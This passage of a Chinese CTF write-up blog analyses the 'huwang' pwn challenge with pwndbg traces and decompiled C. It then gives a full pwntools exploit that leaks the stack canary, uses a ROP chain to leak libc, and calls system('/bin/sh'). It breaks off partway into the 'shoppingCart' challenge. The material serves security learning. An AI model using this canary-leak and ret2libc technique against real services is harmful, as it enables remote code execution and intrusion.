class="number">7</span>位为<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、将处理后的随机数写入/tmp/secret</span><br><span class="line">   <span class="number">0x401245</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>]</span><br><span class="line">   <span class="number">0x401248</span>    <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x40124d</span>    <span class="keyword">mov</span>    <span class="built_in">rsi</span>, <span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x401250</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"> ► <span class="number">0x401252</span>    <span class="keyword">call</span>   <span class="number">0x400b38</span>	write(SHIDWORD(v1), s, 12uLL)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x3</span> /tmp/secret</span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span>  随机数</span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、看看第二次打开/tmp/secret时的文件描述符的值</span><br><span class="line">   <span class="number">0x40126b</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x401270</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019c1</span></span><br><span class="line">   <span class="number">0x401275</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40127a</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>	v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7ffff76c08f0</span> (__close_nocancel+<span class="number">7</span>) ◂— <span class="keyword">cmp</span>    <span class="built_in">rax</span>, -<span class="number">0xfff</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 和第一次打开的文件描述符一样？前一个文件描述符已经关闭了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、看看第三次打开/tmp/secret时的文件描述符的值</span><br><span class="line"> ► <span class="number">0x401303</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>	HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>)<span class="comment">; </span></span><br><span class="line"> pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x201</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdc51</span> ◂— <span class="number">0xfa00000000000031</span> /* <span class="string">'1'</span> */</span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 	依旧是<span class="number">3</span>，因为前面两次都关闭了文件描述符</span><br><span class="line">文件描述符的值始终是当前可用的最小的值，<span class="number">0x00</span>、<span class="number">0x01</span>、<span class="number">0x02</span>分别被stdin、stdout、stderr占据，所以之前没有打开的文件时，当前打开的文件的文件描述符为<span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、查看保存文件描述符的变量的值</span><br><span class="line">   <span class="number">0x401308</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x40130b</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x401312</span>    <span class="keyword">jmp</span>    <span class="number">0x40132d</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>		v2=<span class="number">0x0000000300000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> ffffffff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">0101000000010100</span> <span class="number">0000000001000100</span></span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、当加密次数输入为-<span class="number">1</span>时，一直处于加密循环中</span><br><span class="line">   <span class="number">0x40132d</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>]   v2</span><br><span class="line">   <span class="number">0x401330</span>    <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x74</span>]   encrypt_nums</span><br><span class="line"> ► <span class="number">0x401333</span>  ✔ <span class="keyword">jb</span>     <span class="number">0x401314</span>	(unsigned <span class="keyword">int</span>)v2 &lt; encrypt_nums</span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>	  v2=<span class="number">0x00000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">00000000</span> <span class="number">00000003</span> <span class="number">00000004</span> ffffffff</span><br><span class="line">00007fffffffdc90     <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdcb0     ffffddf0 00007fff <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x74</span>	  encrypt_nums=<span class="number">0xffffffff</span></span><br><span class="line">00007fffffffdc8c     ffffffff <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdc9c     <span class="number">00000000</span> <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span></span><br><span class="line">00007fffffffdcac     <span class="number">00000000</span> ffffddf0 00007fff <span class="number">00000000</span></span><br><span class="line">00007fffffffdcbc     <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> f75ffe90</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、canary</span><br><span class="line">option_666()</span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"> <span class="built_in">RSP</span>  <span class="number">0x7fffffffdc80</span> ◂— <span class="number">0x5000000</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">c:</span><span class="number">0060</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdce0</span> ◂— <span class="number">0x4141414141414141</span> (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">... ↓</span><br><span class="line">0f:<span class="number">0078</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span> 	&lt;&lt;canary</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line">get_option_num()</span><br><span class="line">   <span class="number">0x400d47</span>    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">0x400d48</span>    <span class="keyword">mov</span>    <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x400d4b</span>    <span class="keyword">sub</span>    <span class="built_in">rsp</span>, <span class="number">0x20</span></span><br><span class="line">   <span class="number">0x400d4f</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0x28</span>]</span><br><span class="line"> ► <span class="number">0x400d58</span>    <span class="keyword">mov</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">8</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdc68</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span>  &lt;&lt;canary</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdc70</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line">得出一个结论，每次程序运行后，所有函数使用的canary值是一样的，以前我认为是不一样的。我没有做更多的验证，所以我也不是很确定对不对。</span><br><span class="line">还有就是都是从<span class="built_in">fs</span>：<span class="number">0x28</span>取canary。</span><br></pre></td></tr></table></figure>
<p>我们绕过了MD5验证，进入cmp_md5_true()函数看看。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">cmp_md5_true</span><span class="params">(__int64 name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> occupation; <span class="comment">// [rsp+20h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+120h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations, %s guessed my secret!\n"</span>, name);<span class="comment">// leak canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And I want to know someting about you, and introduce you to other people who guess the secret!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What`s your occupation?"</span>);</span><br><span class="line">  get_choose(&amp;occupation, <span class="number">255L</span>L);</span><br><span class="line">  v3 = <span class="built_in">snprintf</span>(</span><br><span class="line">         &amp;s,</span><br><span class="line">         <span class="number">0xFF</span>uLL,</span><br><span class="line">         <span class="string">"I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........."</span></span><br><span class="line">         <span class="string">"................................................................................................."</span>,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occupation);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is your introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself[Y/N]"</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">'Y'</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, v3 - <span class="number">1</span>);                        <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The final presentation is as follows:%s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当我们输入的名字长度为0x19字节时，就可以leak出canary,得到canary，我们就可以绕过canary保护机制，然后再利用ROP绕过NX,执行shellcode了。由于libc是开启PIE的，所以我们直接使用确定的函数地址，只能动态获得。我们通过调用cmp_md5_true()函数，传入参数为puts()函数的got表地址，因为之前已经调用过puts()函数了，所以可以直接打印出puts()函数的地址。然后我们就可以确定libc的基地址，从而获得system()的地址和/bin/sh的地址。获得shell。</p>
<h4 id="0x03-exp-2"><a href="#0x03-exp-2" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./huwang'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./huwang'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401573</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">cmp_md5_true = <span class="number">0x40101C</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">option_666</span><span class="params">(io,name,guess,encrypt_num,md5_ciphertext,flag)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command&gt;&gt; \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'666'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'please input your name\n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Do you want to guess the secret?\n'</span>)</span><br><span class="line">    io.sendline(guess)</span><br><span class="line">    io.recvuntil(<span class="string">'Input how many rounds do you want to encrypt the secret:\n'</span>)</span><br><span class="line">    io.sendline(str(encrypt_num))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'Try to guess the md5 of the secret\n'</span>)</span><br><span class="line">        io.send(md5_ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_remote</span><span class="params">(ip,port,breakpoint)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">'./huwang'</span>,env = &#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        <span class="comment"># gdb.attach(io,breakpoint)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_encrypt</span><span class="params">(plaintext)</span>:</span></span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(plaintext.encode())</span><br><span class="line">    ciphertext = md.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> ciphertext.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    io1 = debug_remote(ip,port,<span class="string">''</span>)</span><br><span class="line">    option_666(io1,<span class="string">'Sp4n9x'</span>,<span class="string">'y'</span>,<span class="number">-1</span>,<span class="string">'Sp4n9x'</span>,<span class="number">0</span>)</span><br><span class="line">    io1.recvuntil(<span class="string">'timeout~\n'</span>)</span><br><span class="line"></span><br><span class="line">    io2 = debug_remote(ip,port,<span class="string">'b *0x040110D\nc'</span>)</span><br><span class="line">    md5_ciphertext = md5_encrypt(<span class="string">'\x00'</span>*<span class="number">16</span>)</span><br><span class="line">    option_666(io2,<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>),<span class="string">'y'</span>,<span class="number">1</span>,md5_ciphertext,<span class="number">1</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(io2)</span></span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + io2.recvn(<span class="number">7</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(canary)</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000602F70 &lt;- puts_got</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- cmp_md5_true</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode1 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode1 += p64(pop_rdi_ret) + p64(puts_got) + p64(cmp_md5_true)</span><br><span class="line">    io2.send(shellcode1)</span><br><span class="line">    io2.recvuntil(<span class="string">'Congratulations, '</span>)</span><br><span class="line">    puts_addr = u64(io2.recvn(<span class="number">6</span>) + <span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + int(next(libc.search(<span class="string">'/bin/sh'</span>),<span class="number">16</span>))</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000602F70 &lt;- '/bin/sh'</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- system</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode2 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">    io2.send(shellcode2)</span><br><span class="line"></span><br><span class="line">    io2.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exploit(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题前面的Note菜单有点迷惑人，让人以为是一道堆相关的题目，打开IDA分析后，发现与堆没有任何关系。主要考查的是，open()的参数flags的几个选项的作用。还有就是有符号数与无符号数进行比较会发生的错误。以及通过泄露canary的值实现栈溢出，通过ROP绕过NX保护，ret2libc获取shell。</p>
<h3 id="shoppingCart"><a href="#shoppingCart" class="headerlink" title="shoppingCart"></a>shoppingCart</h3><h4 id="0x00-file-amp-amp-checksec-3"><a href="#0x00-file-amp-amp-checksec-3" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file shoppingCart </span><br><span class="line">shoppingCart: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3fcbc93317b6160fe21ecee679180c2a99c67685, stripped</span><br><span class="line">$ checksec shoppingCart </span><br><span class="line">[*] &apos;/home/...../Desktop/shoppingcart/shoppingCart&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>恩，一个64bit的程序，去除了符号表，开启了全部保护。开了PIE就需要泄露地址，所以有点麻烦。</p>
<h4 id="0x01-运行程序，观察程序功能-1"><a href="#0x01-运行程序，观察程序功能-1" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer@ubuntu64:~/Desktop/shoppingcart$ ./shoppingCart </span><br><span class="line">/***</span><br><span class="line">*    |)    |)    |)    </span><br><span class="line">*    |)L|\/|)L|\/|)L|\/ </span><br><span class="line">*        /     /     / </span><br><span class="line">*/</span><br><span class="line">EMMmmm, you will be a rich man!</span><br><span class="line">cmskmsk</span><br><span class="line">EMMmmm, you will be a rich man!</span><br></pre></td></tr></table></figure>
<p>程序只是输出了一些信息，并未提示让我们输入什么。所以利用IDA静态分析一下。</p>
<h4 id="0x02-IDA静态分析"><a href="#0x02-IDA静态分析" class="headerlink" title="0x02 IDA静态分析"></a>0x02 IDA静态分析</h4><p>mian()函数里有两个自定义函数。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"/***\n*    |)    |)    |)    \n*    |)L|\\/|)L|\\/|)L|\\/ \n*        /     /     / \n*/"</span>)<span class="comment">;</span></span><br><span class="line">  money_menu()<span class="comment">;</span></span><br><span class="line">  goods_menu()<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"Happy Shopping Day!\nbye~"</span>)<span class="comment">;</span></span><br><span class="line">  return 0LL<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个是与money有关的函数，一个是与goods有关的函数。我们先来看看money_menu()。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">money_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"EMMmmm, you will be a rich man!"</span>);</span><br><span class="line">      fgets(&amp;option_str, <span class="number">24</span>, <span 